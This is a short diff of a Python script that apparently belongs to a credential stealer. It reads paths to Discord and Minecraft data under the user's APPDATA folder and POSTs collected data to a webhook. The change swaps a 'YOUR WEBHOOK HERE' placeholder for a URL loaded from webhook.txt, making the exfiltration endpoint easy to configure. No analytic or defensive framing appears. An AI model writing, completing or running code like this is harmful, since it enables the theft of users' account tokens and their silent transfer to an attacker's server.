@@ -19,6 +19,8 @@ TEMP = os.getenv("TEMP")
 ROAMING = os.getenv("APPDATA")
 mcpath = ROAMING + "\\.minecraft"
 
+webhookurl = open("webhook.txt", "r").read().strip()
+
 PATHS = {
 
     "Discord": ROAMING + "\\Discord",
@@ -348,7 +350,7 @@ def main():
     try:
 
         urlopen(Request(
-            "YOUR WEBHOOK HERE",
+            webhookurl,
             data=dumps(webhook).encode(), headers=getheaders()))
 
     except:
